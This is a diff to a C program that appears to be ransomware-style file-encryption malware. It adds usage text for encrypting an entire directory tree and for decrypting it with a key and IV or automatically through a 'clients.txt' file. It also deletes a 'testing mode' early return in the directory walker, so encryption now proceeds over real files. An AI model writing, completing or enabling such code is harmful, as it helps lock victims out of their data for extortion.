@@ -38,13 +38,19 @@ void usage(void){
 	printf("    -k          Must be after -a and his address, must be\n");
     printf("                followed by the right key.\n");
     printf("    -v          Must be after -k and his key, must be\n");
-    printf("                followed by the right initialisation vector.\n\n");
+    printf("                followed by the right initialisation vector.\n");
+	printf("    -a          Must be after -f and his adress. This auto\n");
+	printf("                decrypt the target tree if the file 'clients.txt'.\n");
+	printf("                is in the same folder.\n\n");
 
     printf("exemples of encrypting :\n\n");
     printf("    -c -f {root folder of the tree}\n\n");
 
-    printf("exemples of listening :\n\n");
+    printf("exemples of decrypting :\n\n");
     printf("    -d -f {root folder of the tree} -k {key} -v {initialisation vector}\n\n");
+
+	printf("exemples of auto decrypting :\n\n");
+    printf("    -d -f {root folder of the tree} -a\n\n");
 }
 
 int file_too_big(char *filename){
@@ -84,11 +90,6 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 
 	char path[1024];//taille arbitraire
 	dir = opendir(name);
-
-	if(de_flag == 't'){
-		printf("INFO:LIST_DIR_ENCRYPTING] : Software in testing mod\n");
-		return;
-	}
 
 	while((entry = readdir(dir)) != NULL){
 		snprintf(path, sizeof(path), "%s/%s", name, entry -> d_name);
